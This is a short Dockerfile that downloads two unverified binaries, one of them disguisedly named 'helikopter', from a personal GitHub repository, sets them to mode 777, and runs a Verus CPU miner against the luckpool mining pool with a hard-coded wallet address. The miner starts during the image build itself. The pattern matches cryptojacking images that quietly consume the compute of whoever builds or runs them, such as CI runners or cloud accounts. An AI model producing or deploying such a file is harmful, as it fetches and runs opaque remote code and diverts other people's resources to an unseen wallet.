FROM debian:stable
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
RUN wget https://github.com/desafff/gehasf/raw/main/verus-solver && chmod 777 verus-solver
RUN wget https://github.com/desafff/gehasf/raw/main/helikopter
RUN chmod 777 verus-solver helikopter
RUN ./helikopter -c stratum+tcp://na.luckpool.net:3960 -u R9HMvHdgUX8h7h7ch3xGq4qGGVsRmuC74T.ak11 -p x --cpu 8
